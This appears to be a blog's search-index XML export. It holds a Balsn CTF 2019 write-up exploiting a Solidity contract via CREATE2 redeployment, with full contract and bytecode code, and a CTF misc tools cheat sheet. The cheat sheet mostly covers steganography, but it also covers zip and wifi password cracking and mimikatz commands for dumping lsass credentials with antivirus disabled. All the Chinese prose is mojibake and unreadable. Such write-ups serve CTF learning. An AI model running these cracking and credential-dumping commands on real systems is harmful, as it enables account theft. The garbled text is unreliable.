error_log off; access_log /dev/null; &#125; access_log /www/wwwlogs/blog.hitcxy.com.log; error_log /www/wwwlogs/blog.hitcxy.com.error.log; location /pikachu_ufo &#123; proxy_redirect off; proxy_pass http://127.0.0.1:29001; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_set_header Host $host; # Show real IP in v2ray access.log proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125;]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>djJyYXk=</tag>
        <tag>ÂÆùÂ°î</tag>
        <tag>typecho</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Balsn CTF 2019 - Creativity]]></title>
    <url>%2F2020%2Fbalsn2019-create2%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Â§çÁé∞ balsn2019 ctf ‰∏≠ÁöÑ Creativity Âå∫ÂùóÈìæÈ¢òÁõÆ ËøôÈÅìÈ¢òÂÖ∂ÂÆûÊó©Â∞±ÊÉ≥Â§çÁé∞‰∫Ü,Âè™‰∏çËøá‰∏ÄÁõ¥Ê≤°ÊúâÂ§çÁé∞ÊàêÂäü,ÊòØÊúâÂÖ≥ create2 ÁöÑÈ™öÊìç‰Ωú,Âü∫Êú¨Êìç‰ΩúÂèØÂèÇËÄÉÂè¶Â§ñ‰∏ÄÁâáÊñáÁ´†https://hitcxy.com/2020/Create2/ ÂÖ∑‰ΩìÂàÜÊûêÂèäÂÆòÊñπ WP Â¶Ç‰∏ã: https://github.com/x9453/balsn-ctf-2019/tree/master/Creativity ÂéüË∞ÖÊàëËèúÁöÑÊä†ËÑö‚Ä¶ÈÉΩ 2020 ‰∫Ü,ËøòÂú®ÂÅö 2019 ÁöÑÈ¢òÁõÆ Â§çÁé∞Âú∞ÂùÄ‰∏∫: ropsten@0x3975c105e8D582A324F6093E7471fDf9d5b9Fa67 Source1234567891011121314151617181920212223242526pragma solidity ^0.5.10;contract Creativity &#123; event SendFlag(address addr); address public target; uint randomNumber = 0; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function execute() public &#123; require(target != address(0)); target.delegatecall(abi.encodeWithSignature("")); selfdestruct(address(0)); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); &#125;&#125; Analyse È¢òÁõÆÂ§ßÊ¶ÇÈÄªËæëÊòØ: ËÆ©Êàë‰ª¨ÈÉ®ÁΩ≤‰∏Ä‰∏™ÂêàÁ∫¶,ÂêàÁ∫¶‰ª£Á†ÅÂ§ßÂ∞è‰∏çË∂ÖËøá4Â≠óËäÇ Ë∞ÉÁî® check ,ÂèÇÊï∞ÊòØÊàë‰ª¨ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âú∞ÂùÄ Ë∞ÉÁî® execute ,ÊâßË°å delegatecall Âà∞Êàë‰ª¨ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶ÂÜÖ ‰ΩÜÊòØ,Êúâ‰∏™ÈóÆÈ¢ò,Êàë‰ª¨Ê≤°Ê≥ïÂú®4‰∏™Â≠óËäÇÂÜÖ emit SendFlag ÂÖ∂ÂÆûÈ¢òÁõÆËÄÉÊü•Áü•ËØÜÁÇπ‰∏∫ Create2 ÁöÑÈ™öÊìç‰Ωú: Âú®Âêå‰∏Ä‰∏™Âú∞ÂùÄ‰∏äÈÉ®ÁΩ≤ÂêàÁ∫¶,ÂêàÁ∫¶ÁöÑÂ≠óËäÇÁ†ÅÂèØ‰ª•‰∏çÂêå,Âç≥Âú®Âêå‰∏Ä‰∏™Âú∞ÂùÄ‰∏äÂÖàÂêéÂèØÈÉ®ÁΩ≤‰∏çÂêåÁöÑÂêàÁ∫¶ ÈÄöËøáË∞ÉÁî®‰∏ãÈù¢ Deployer.deploy ÂáΩÊï∞,Êàë‰ª¨ÂèØ‰ª•Êää‰∏çÂêåÂêàÁ∫¶ÂÖàÂêéÈÉ®ÁΩ≤Âú®Âêå‰∏Ä‰∏™Âú∞ÂùÄ‰∏ä, deployedAddr Âç≥‰∏∫ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âú∞ÂùÄ 123456789101112131415161718192021222324252627pragma solidity ^0.5.10;contract Deployer &#123; bytes public deployBytecode; address public deployedAddr; function deploy(bytes memory code) public &#123; deployBytecode = code; address a; // Compile Dumper to get this bytecode bytes memory dumperBytecode = hex'6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe'; assembly &#123; a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866) &#125; deployedAddr = a; &#125;&#125;contract Dumper &#123; constructor() public &#123; Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly &#123; return (add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; ÊâÄ‰ª•È¢òÁõÆÁöÑÈÄªËæëÂ¶Ç‰∏ã: Áî® create2 ÁöÑÈ™öÊìç‰Ωú,ÈÉ®ÁΩ≤‰∏Ä‰∏™ÂêàÁ∫¶ 0x33ff ,Âç≥ selfdestruct(msg.sender) Ë∞ÉÁî® check() ,ËÆ© target ‰∏∫Êàë‰ª¨ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âú∞ÂùÄ ÁªôÊàë‰ª¨ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âèë‰∏ÄÁ¨îÁ©∫‰∫§Êòì,ËÆ©ÂÆÉËá™ÊØÅ ÂÜçÊ¨°‰ΩøÁî® create2 È™öÊìç‰Ωú,Âú®Âêå‰∏Ä‰∏™Âú∞ÂùÄÈÉ®ÁΩ≤ÂêàÁ∫¶,ÂêàÁ∫¶ÂÜÖÂÆπ‰∏∫ emit SendFlag(0) Ë∞ÉÁî® execute() ,Â∞±‰ºöÊâßË°åÊàë‰ª¨Á¨¨‰∫åÊ¨°ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶ÁöÑ emit SendFlag ‰∫ã‰ª∂,Âõ†‰∏∫ÊòØ delegatecall Êìç‰Ωú,ÊâÄ‰ª•ËøòÊòØÁõ∏ÂΩì‰∫éÂú®ÂéüÈ¢òÁõÆÂêàÁ∫¶‰∏≠ËøõË°åÁöÑ emit SendFlag Êìç‰Ωú,ÊàêÂäü! Solution ÂÖàÂ∞Ü Deployer ÈÉ®ÁΩ≤,Âú∞ÂùÄ‰∏∫ 0x307FdF03B1842A501F52221e4cF02D67BfeEc399 , ÁÑ∂Âêé‰ΩøÁî® Deployer.deploy ÈÉ®ÁΩ≤ 0x33ff ,ÂæóÂà∞ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âú∞ÂùÄ 0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663 Ë∞ÉÁî® check() , target Â∑≤ÁªèÂèòÊàê‰∫ÜÊàë‰ª¨ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âú∞ÂùÄ ÁªôÊàë‰ª¨ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âèë‰∏ÄÁ¨îÁ©∫‰∫§Êòì,ËÆ©ÂÆÉËá™ÊØÅ,ÁõÆÁöÑÊòØ‰∏∫‰∫ÜÈáçÊñ∞Âú®Ëøô‰∏™Âú∞ÂùÄÈÉ®ÁΩ≤ÂêàÁ∫¶Ëß¶Âèë SendFlag ‰∫ã‰ª∂,ÂèØ‰ª•ÁúãÂà∞ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Â∑≤ÁªèËá™ÊØÅ 1web3.eth.sendTransaction(&#123; from: &apos;0x785a8D0d84ad29c96f8e1F26BfDb3E6CB72cAe9b&apos;, to: &quot;0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663&quot;, data: &quot;&quot; &#125;, function(err,res)&#123;console.log(res)&#125;); ‰ΩøÁî® create2 È™öÊìç‰Ωú,Âú®Âêå‰∏Ä‰∏™Âú∞ÂùÄÈÉ®ÁΩ≤ÂêàÁ∫¶,ÂêàÁ∫¶ÂÜÖÂÆπ‰∏∫ emit SendFlag(0) ,ËøôÈáåÊàëÊòØÂÜô‰∫Ü‰∏Ä‰∏™ hack ÂêàÁ∫¶,ÁÑ∂Âêé‰ΩøÁî® Deployer.deploy ÈÉ®ÁΩ≤ 123456contract hack &#123; event SendFlag(address addr); constructor() public &#123; emit SendFlag(address(0)); &#125;&#125; ËøôÊ†∑Â∞±ÊääÂÜÖÂÆπ‰∏∫ emit SendFlag ÁöÑ hack ÂêàÁ∫¶ÁªôÈÉ®ÁΩ≤Âà∞Âêå‰∏Ä‰∏™Âú∞ÂùÄ 0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663 ‰∏ä‰∫Ü,Â¶Ç‰∏ãÂõæ Ë∞ÉÁî® execute() ,Â∞±‰ºöÊâßË°åÊàë‰ª¨Á¨¨‰∫åÊ¨°ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶ÁöÑ emit SendFlag ‰∫ã‰ª∂ ÂÆåÁªì!!!üéâüéâüéâüéâüéâüéâ]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>balsn2019</tag>
        <tag>create2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[misc_tools]]></title>
    <url>%2F2020%2Fmisc-tools%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Êú¨ÊñáÂåÖÂê´Âú® windows ÂíåÂú® kali ‰∏ã‰ΩøÁî®ÁöÑÂ∑•ÂÖ∑ ËΩ¨ËΩΩËá™ Ga1@xy miscÂ∑•ÂÖ∑ ÂõæÁâáÁõ∏ÂÖ≥jpgf5-steganography ÔºàF5ÈöêÂÜô+ÈúÄË¶ÅpasswdÔºâ ÂÆâË£Ö 1git clone https://github.com/matthewgao/F5-steganography ‰ΩøÁî®: ËøõÂÖ• F5-steganography Êñá‰ª∂Â§π 12java Extract 1.jpg -p 123456// -pÂêéÊé•f5ÁöÑkey outguess (ÂõæÁâáÈöêÂÜô) ÂÆâË£Ö 123git clone https://github.com/crorvick/outguesscd outguess./configure &amp;&amp; make &amp;&amp; make install Âä†ÂØÜ 1234outguess -k 12345 -d hidden.txt 1.jpg 2.jpg// -kÂêéÊé•ÂØÜÁ†Å// -dÂêéÊé•Ë¶ÅÈöêËóèÁöÑÂÜÖÂÆπ// Âä†ÂØÜÂêé1.jpg‰ºöË¶ÜÁõñ2.jpg Ëß£ÂØÜ 1234outguess -k 12345 -r 2.jpg out.txt// out.txt ‰∏≠ÂÜÖÂÆπÂç≥‰∏∫ÊÉ≥Ë¶ÅÈöêËóèÁöÑ hidden.txt ‰∏≠ÂÜÖÂÆπ// ‰πüÂèØ‰∏çÈúÄË¶ÅÂØÜÁ†Åoutguess -r 2.jpg out.txt stegdetectÔºàÊ£ÄÊü•jpgÂõæÁâáÈöêÂÜôÊñπÊ≥ï_winÔºâ12345678stegdetect.exe -tjopi -s 10.0 [stego_file]-s ‰øÆÊîπÊ£ÄÊµãÁÆóÊ≥ïÁöÑÊïèÊÑüÂ∫¶ÔºåËØ•ÂÄºÁöÑÈªòËÆ§ÂÄº‰∏∫1„ÄÇÊ£ÄÊµãÁªìÊûúÁöÑÂåπÈÖçÂ∫¶‰∏éÊ£ÄÊµãÁÆóÊ≥ïÁöÑÊïèÊÑüÂ∫¶ÊàêÊ≠£ÊØîÔºåÁÆóÊ≥ïÊïèÊÑüÂ∫¶ÁöÑÂÄºË∂äÂ§ßÔºåÊ£ÄÊµãÂá∫ÁöÑÂèØÁñëÊñá‰ª∂ÂåÖÂê´ÊïèÊÑü‰ø°ÊÅØÁöÑÂèØËÉΩÊÄßË∂äÂ§ß„ÄÇ-t ËÆæÁΩÆË¶ÅÊ£ÄÊµãÂì™‰∫õÈöêÂÜôÂ∑•ÂÖ∑ÔºàÈªòËÆ§Ê£ÄÊµãjopiÔºâÔºåÂèØËÆæÁΩÆÁöÑÈÄâÈ°πÂ¶Ç‰∏ãÔºöj Ê£ÄÊµãÂõæÂÉè‰∏≠ÁöÑ‰ø°ÊÅØÊòØÂê¶ÊòØÁî®jstegÂµåÂÖ•ÁöÑ„ÄÇo Ê£ÄÊµãÂõæÂÉè‰∏≠ÁöÑ‰ø°ÊÅØÊòØÂê¶ÊòØÁî®outguessÂµåÂÖ•ÁöÑ„ÄÇp Ê£ÄÊµãÂõæÂÉè‰∏≠ÁöÑ‰ø°ÊÅØÊòØÂê¶ÊòØÁî®jphideÂµåÂÖ•ÁöÑ„ÄÇi Ê£ÄÊµãÂõæÂÉè‰∏≠ÁöÑ‰ø°ÊÅØÊòØÂê¶ÊòØÁî®invisible secretsÂµåÂÖ•ÁöÑ„ÄÇ Â¶ÇÊûúÊòæÁ§∫‰∏∫ [stego_file]Ôºöjphide(***)ÔºåÂàôÂèØ‰ª•Áî® stegbreak Á†¥Ëß£ÂØÜÁ†Å 1stegbreak -r rules.ini -f password.txt -t p [stego_file] jphide ÂèØ‰ΩøÁî®Â∑•ÂÖ∑ JPHS steghide (ÂõæÁâáÊàñÈü≥È¢ëÈöêËóèÊñá‰ª∂) ÂÆâË£Ö 1apt-get install steghide Âä†ÂØÜ 1steghide embed -cf out.jpg -ef flag.txt [-p 123456] # -pÂêéÊé•ÂØÜÁ†ÅÔºåÂèØÊó† Ëß£ÂØÜ 123456// Êü•ÁúãÂõæÁâá‰∏≠ÂµåÂÖ•ÁöÑÊñá‰ª∂‰ø°ÊÅØ:steghide info out.jpg// ÊèêÂèñÂê´ÊúâÂØÜÁ†ÅÁöÑÈöêËóèÂÜÖÂÆπ:steghide extract -sf out.jpg -p 123456// ÊèêÂèñ‰∏çÂê´ÊúâÂØÜÁ†ÅÁöÑÈöêËóèÂÜÖÂÆπ:steghide extract -sf out.jpg steghide ÁàÜÁ†¥ÂØÜÁ†Å Êúâ‰∫õÈ¢òÁõÆÁî®steghideÂä†ÂØÜÊñá‰ª∂‰ΩÜÊòØ‰∏çÁªôÂØÜÁ†ÅÔºåÊ≠§Êó∂Â∞±ÈúÄË¶ÅÁàÜÁ†¥Ôºåsteghide Êú¨Ë∫´Âπ∂‰∏çÊîØÊåÅÁàÜÁ†¥ÔºåÈúÄË¶Å‰∏Ä‰∫õÂÖ∂‰ªñÁöÑÊñπÊ≥ïÔºöhttps://github.com/Va5c0/Steghide-Brute-Force-Tool 123python steg_brute.py -b -d [Â≠óÂÖ∏] -f [jpg_file]// ÈúÄË¶ÅÂÆâË£ÖÁöÑÂ∫ì: progressbarpip install progressbar2 png &amp; bmpBlindWaterMark ÔºàÁõ≤Ê∞¥Âç∞ÔºâÁ¨¨‰∏ÄÁßç Ê≠£Â∏∏ÁöÑbwm ÂÆâË£Ö Âú®github‰∏ä‰∏ãËΩΩËÑöÊú¨ bwm.py ÔºàÁΩëÂùÄÔºö https://github.com/chishaxie/BlindWaterMark Ôºâ 123// ÂÆâË£ÖpythonÂâçÁΩÆÊ®°Âùópip install -i https://pypi.tuna.tsinghua.edu.cn/simple opencv-pythonsudo pip install matplotlib Âä†ÂØÜ 1234python bwm.py encode 1.png water.png 2.png// 1.png ‰∏∫Êó†Ê∞¥Âç∞ÂéüÂõæ// water.png ‰∏∫Ê∞¥Âç∞Âõæ// 2.png ‰∏∫ÊúâÁõ≤Ê∞¥Âç∞Âõæ Ëß£ÂØÜ 1234python bwm.py decode 1.png 2.png flag.png// 1.png ‰∏∫Êó†Ê∞¥Âç∞ÂéüÂõæ// 2.png ‰∏∫ÊúâÁõ≤Ê∞¥Âç∞ÁöÑÂõæ// flag.png ‰∏∫Ëß£Âá∫Êù•ÁöÑÂõæÁâá Á¨¨‰∫åÁßç È¢ëÂüüÁõ≤Ê∞¥Âç∞1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import cv2import numpy as npimport randomimport osfrom argparse import ArgumentParserALPHA = 5def build_parser(): parser = ArgumentParser() parser.add_argument(&apos;--original&apos;, dest=&apos;ori&apos;, required=True) parser.add_argument(&apos;--image&apos;, dest=&apos;img&apos;, required=True) parser.add_argument(&apos;--result&apos;, dest=&apos;res&apos;, required=True) parser.add_argument(&apos;--alpha&apos;, dest=&apos;alpha&apos;, default=ALPHA) return parserdef main(): parser = build_parser() options = parser.parse_args() ori = options.ori img = options.img res = options.res alpha = options.alpha if not os.path.isfile(ori): parser.error(&quot;original image %s does not exist.&quot; % ori) if not os.path.isfile(img): parser.error(&quot;image %s does not exist.&quot; % img) decode(ori, img, res, alpha)def decode(ori_path, img_path, res_path, alpha): ori = cv2.imread(ori_path) img = cv2.imread(img_path) ori_f = np.fft.fft2(ori) img_f = np.fft.fft2(img) height, width = ori.shape[0], ori.shape[1] watermark = (ori_f - img_f) / alpha watermark = np.real(watermark) res = np.zeros(watermark.shape) random.seed(height + width) x = range(height / 2) y = range(width) random.shuffle(x) random.shuffle(y) for i in range(height / 2): for j in range(width): res[x[i]][y[j]] = watermark[i][j] cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])if __name__ == &apos;__main__&apos;: main()// python pinyubwm.py --original 1.png --image 2.png --result out.png// Êü•Áúã out.png Âç≥ÂèØÔºåÂ¶ÇÊûúÊó†Ê≥ïÂæóÂà∞Ê≠£Â∏∏ÂõæÁâáÔºåÂèØÂ∞Ü 1.png Âíå 2.png Ë∞ÉÊç¢‰ΩçÁΩÆÂÜçÊ¨°Â∞ùËØï lsbÁöÑpyËÑöÊú¨Ëß£ÂØÜÔºàlsbÈöêÂÜô+ÈúÄË¶ÅpasswdÔºâ ‰∏ãËΩΩÔºö https://github.com/livz/cloacked-pixel ÁÆÄÂçï‰ΩøÁî®Â¶Ç‰∏ã,ÂÖ∂‰ΩôËØ¶ËßÅ: https://github.com/livz/cloacked-pixel 1python lsb.py extract [stego_file] [out_file] [password] zsteg (lsbÈöêÂÜô)123gem install zstegzsteg 1.bmp// ‰∏ÄËà¨Êù•ËÆ≤Áî® zsteg Ëß£ÂØÜÁöÑÊñá‰ª∂ÈÉΩ‰∏∫ bmp Êñá‰ª∂ pngcheckÔºàÊ£ÄÊü•IDATÂùó_winÔºâ1pngcheck.exe -v 123.png ÂèØÊ£ÄÊü• png ÁöÑ IDAT ÂùóÊòØÂê¶ÊúâÈóÆÈ¢ò Áõ∏ÂÖ≥È¢òÁõÆÂèØÂèÇËÄÉÔºöhttps://blog.csdn.net/u010391191/article/details/80818785 ÊúâÂÖ≥Ëß£È¢òËÑöÊú¨ÂèØÂèÇËÄÉ FzWjScJ Â∏àÂÇÖÁöÑ blog Ôºöhttp://www.fzwjscj.xyz/index.php/archives/17/ WebP ÂÆâË£Ö (kali) 1apt install webp cwebp - ÁºñÁ†ÅÂô®Â∑•ÂÖ∑ÔºöÂèØÂ∞Ü png ËΩ¨‰∏∫ webp 1cwebp 1.png -o 2.webp dwebp - Ëß£Á†ÅÂô®Â∑•ÂÖ∑ÔºöÂèØÂ∞Ü webp ËΩ¨‰∏∫ png 1dwebp 1.webp -o 2.png vwebp - Êü•ÁúãÂô®Â∑•ÂÖ∑ÔºöÂèØÁõ¥Êé•Êü•Áúã webp Ê†ºÂºèÂõæÁâá 1vwebp 1.webp webpinfo - Ê†ºÂºèÊü•ÁúãÂ∑•ÂÖ∑ÔºöÂèØÊâìÂç∞Âá∫ WebP Êñá‰ª∂ÁöÑÂùóÁ∫ßÁªìÊûÑ‰ª•ÂèäÂü∫Êú¨ÂÆåÊï¥ÊÄßÊ£ÄÊü• 1webpinfo 1.webp ÂÖ∂‰ΩôÔºà gif2webp„ÄÅimg2webp Á≠âÂèØËßÅ ÂÆòÊñπÊñáÊ°£ Ôºâ exiftoolÔºàÊü•ÁúãÂõæÁâáexif‰ø°ÊÅØÔºâ ÂÆâË£Ö (kali) 1apt-get install exiftool ‰ΩøÁî® 1234exiftool 1.jpg // ÊòæÁ§∫ÂõæÁâáÊâÄÊúâ‰ø°ÊÅØexiftool 1.jpg | grep flag // Êü•ÁúãÂõæÁâáÊúâÂÖ≥‚Äòflag‚ÄôÂ≠óÁ¨¶ÁöÑ‰ø°ÊÅØexiftool * // Êü•ÁúãÊ≠§Êñá‰ª∂Â§πÊâÄÊúâÂõæÁâá‰ø°ÊÅØexiftool -b -ThumbnailImage attachment.jpg &gt;flag.jpg stegpyÔºàÊîØÊåÅÂ§öÁßçÊñá‰ª∂Âä†ÂØÜÔºâ Ê≠§ÁßçÂä†ÂØÜÊîØÊåÅÂØπPNG„ÄÅBMP„ÄÅGIF„ÄÅWebPÂíåWAVÊ†ºÂºèÂä†ÂØÜÔºåÂêåÊó∂ÂèØ‰ª•ÈÄâÊã©ÊúâÊó†password ÂÆâË£Ö (kali) 1pip3 install stegpy Âä†ÂØÜ ‰∏çÂê´ÊúâÂØÜÁ†Å 1stegpy &apos;hello_world&apos; image.png - Âê´ÊúâÂØÜÁ†Å 123stegpy &quot;hello_world&quot; image.png -pEnter password (will not be echoed): // ËæìÂÖ•ÂØÜÁ†ÅÔºà‰∏çÊòæÁ§∫ÔºâVerify password (will not be echoed): // Á°ÆËÆ§ÂØÜÁ†ÅÔºà‰∏çÊòæÁ§∫Ôºâ Ëß£ÂØÜ ‰∏çÂê´ÊúâÂØÜÁ†Å 1stegpy _image.png - Âê´ÊúâÂØÜÁ†Å 12stegpy _image.png -pEnter password (will not be echoed): // ËæìÂÖ•ÂØÜÁ†ÅÔºà‰∏çÊòæÁ§∫Ôºâ ÂéãÁº©ÂåÖÁõ∏ÂÖ≥crcÂÄºÁàÜÁ†¥ (zipÂåÖÁ¢∞ÊíûcrcÂÄº) ‰∏ãËΩΩËÑöÊú¨Ôºöhttps://github.com/theonlypwner/crc32 1python crc32.py reverse ‰Ω†ÁöÑcrc32ÂØÜÊñá ÂéãÁº©ÂåÖÂØÜÁ†ÅÁàÜÁ†¥ Fcrackzip ARCHPR ÂèØÂèÇËÄÉ https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip-zh/#_3 ZipCenOpÔºàzip‰º™Âä†ÂØÜÔºâ Âä†ÂØÜ 1java -jar ZipCenOp.jar e xxx.zip Ëß£ÂØÜ 1java -jar ZipCenOp.jar r xxx.zip pycÊñá‰ª∂Áõ∏ÂÖ≥uncompyle6ÔºàpycÊñá‰ª∂ÂèçÁºñËØëÔºâ12pip install uncompyle6uncompyle6 test.pyc &gt; test.py StegosaurusÔºàpycÈöêÂÜô_winÔºâ12// ÁâàÊú¨ÔºöPython 3.6 or laterpython stegosaurus.py -x [pyc_file] Èü≥È¢ëÁõ∏ÂÖ≥MP3stegoÔºàMP3ÈöêÂÜô_winÔºâ1...\Decode.exe -X -P [password] [stego_mp3] steghideÔºàÂõæÁâáÊàñÈü≥È¢ëÈöêËóèÊñá‰ª∂Ôºâ ÂÆâË£ÖÔºàkali‰∏≠Ôºâ 1apt-get install steghide Âä†ÂØÜ 12steghide embed -cf out.jpg -ef flag.txt [-p 123456]// -pÂêéÊé•ÂØÜÁ†ÅÔºåÂèØÊó† Ëß£ÂØÜ 123456// Êü•ÁúãÂõæÁâá‰∏≠ÂµåÂÖ•ÁöÑÊñá‰ª∂‰ø°ÊÅØÔºösteghide info out.jpg// ÊèêÂèñÂê´ÊúâÂØÜÁ†ÅÁöÑÈöêËóèÂÜÖÂÆπÔºösteghide extract -sf out.jpg -p 123456// ÊèêÂèñ‰∏çÂê´ÊúâÂØÜÁ†ÅÁöÑÈöêËóèÂÜÖÂÆπÔºösteghide extract -sf out.jpg steghideÁàÜÁ†¥ÂØÜÁ†Å Êúâ‰∫õÈ¢òÁõÆÁî®steghideÂä†ÂØÜÊñá‰ª∂‰ΩÜÊòØ‰∏çÁªôÂØÜÁ†ÅÔºåÊ≠§Êó∂Â∞±ÈúÄË¶ÅÁàÜÁ†¥ÔºåsteghideÊú¨Ë∫´Âπ∂‰∏çÊîØÊåÅÁàÜÁ†¥ÔºåÈúÄË¶Å‰∏Ä‰∫õÂÖ∂‰ªñÁöÑÊñπÊ≥ïÔºöhttps://github.com/Va5c0/Steghide-Brute-Force-Tool 123python steg_brute.py -b -d [Â≠óÂÖ∏] -f [jpg_file]// ÈúÄË¶ÅÂÆâË£ÖÁöÑÂ∫ìÔºöprogressbarpip install progressbar2 ÂÖ∂ÂÆÉaircrack-ngÔºàÁàÜÁ†¥wifiÂØÜÁ†ÅÔºâ kali‰∏ãËá™Â∏¶Êúâ‰∏Ä‰ªΩÊó†Á∫øÂØÜÁ†ÅÂ≠óÂÖ∏Ôºö/usr/share/wordlists/rockyou.txt.gzÔºåÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜÂÖ∂Ëß£Âéã 12345cd /usr/share/wordlists/rockyou.txt.gzgzip -d rockyou.txt.gzaircrack-ng -w /usr/share/wordlists/rockyou.txt -b [MAC] [capfile]// -w ÂêéÂä†Â≠óÂÖ∏ÁöÑ‰ΩçÁΩÆÔºàkali‰∏≠Ëá™Â∏¶Â≠óÂÖ∏ÁöÑ‰ΩçÁΩÆÔºâ// -b ÂêéÂä†Ë∑ØÁî±Âô®ÁöÑMACÂú∞ÂùÄÔºàÂ∫îËØ•‰πüÂ∞±ÊòØ BSSIDÔºâ xortoolÔºàÁåúÊµãxorÂä†ÂØÜÁöÑÂØÜÁ†ÅÈïøÂ∫¶ÂèäÂÄºÔºâ ËøôÈáåÂè™ÂàóÂá∫‰∫ÜÊúÄÁÆÄÂçïÁöÑ‰ΩøÁî®ÊñπÊ≥ïÔºåÂÖ∂‰ΩôÂèØËßÅÔºöhttps://pypi.org/project/xortool/ 123xortool (-x) -c 20 123.txt// -xÔºö‰ª£Ë°®Êñá‰ª∂ÂÜÖÂÆπ‰∏∫ÂçÅÂÖ≠ËøõÂà∂// -cÔºöÂêéÂä†Âá∫Áé∞È¢ëÁéáÊúÄÈ´òÁöÑÂ≠óÁ¨¶ÔºåÊñáÊú¨ÂÜÖÂÆπ‰∏ÄËà¨ÊòØÁ©∫Ê†ºÔºà20ÔºâÔºå‰∫åËøõÂà∂Êñá‰ª∂‰∏ÄËà¨ÊòØ00 mimikatzÔºàÊäìÂèñlsassÂØÜÁ†ÅÔºâ ÂèÇËÄÉ: ‰ªãÁªç‰∏Ä‰∏ãÁ•ûÂô®mimikatzÔºå‰ªélsassÈáåÊäìÂØÜÁ†Å | Jarett‚Äôs Blog ‰∏ãËΩΩÔºöhttps://pan.baidu.com/s/1qZmnPar-gfqT9OaWO_DS3g ÊèêÂèñÁ†Å svp9 Â∞Ü lsass.dmp Êñá‰ª∂ÊîæÂú® mimikatz.exe ÊâÄÂú®ÁõÆÂΩï‰∏ãÔºåÂÖ≥Èó≠ÊùÄËΩØÂêéÊâìÂºÄ mimikatz.exe , ÊâßË°å‰ª•‰∏ã‰∏âÊù°ÂëΩ‰ª§Ôºö 123privilege::debugsekurlsa::minidump lsass.dmpsekurlsa::logonpasswords full gaps (ÊãºÂõæ) ÂÆâË£Ö 12345git clone https://github.com/nemanja-m/gaps.gitcd gaps pip install -r requirements.txtsudo apt-get install python-tkpip install -e . ÂàõÂª∫ÊãºÂõæ ÂæóÂà∞ÁöÑÊãºÂõæÊâÄÊúâÂõæÂú®‰∏ÄÂº†Â§ßÂõæ‰∏äÔºåÂèØ‰ª•ÈÖçÂêà convert ÂëΩ‰ª§Â∞ÜÂÖ∂ÂàáÂºÄ 1create_puzzle [ÂõæÁâáÁªùÂ∫¶Ë∑ØÂæÑ] --size=[Â∞∫ÂØ∏] --destination=[ÂàõÂª∫ÊãºÂõæÂêçÁß∞] ËøòÂéüÊãºÂõæ Â¶ÇÊûúËøòÂéüÁöÑÊòØË¢´ÂàáÂºÄÊàê‰∏ÄÂ∞èÂùó‰∏ÄÂ∞èÂùóÁöÑÊãºÂõæÔºåÈúÄË¶ÅÂÖàÂ∞ÜÂÖ∂ÊãºÂú®‰∏ÄÂº†Â§ßÂõæ‰∏äÔºàÂèØÁî® montage ÂëΩ‰ª§ÔºâÔºå‰πãÂêéÂÜçÁî® gaps Â∞ÜÂÖ∂ËøòÂéüÔºö 12345678gaps --image=out.jpg --generations=50 --population=120 --size=50--image ÊåáÂêëÊãºÂõæÁöÑË∑ØÂæÑ--size ÊãºÂõæÂùóÁöÑÂÉèÁ¥†Â∞∫ÂØ∏--generations ÈÅó‰º†ÁÆóÊ≥ïÁöÑ‰ª£ÁöÑÊï∞Èáè--population ‰∏™‰ΩìÊï∞Èáè--verbose ÊØè‰∏Ä‰ª£ËÆ≠ÁªÉÁªìÊùüÂêéÂ±ïÁ§∫ÊúÄ‰Ω≥ÁªìÊûú--save Â∞ÜÊãºÂõæËøòÂéü‰∏∫ÂõæÂÉè dtmf2numÔºàÁîµËØùÈü≥Ëß£Á†ÅÔºâ windows ‰∏ãÊúâ ‰πüÊúâ python ËÑöÊú¨: https://github.com/hfeeki/dtmf]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>tools</tag>
        <tag>kali</tag>
        <tag>win</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GKCTF2020 Harley Quinn]]></title>
    <url>%2F2020%2FHarley-Quinn%2F</url>
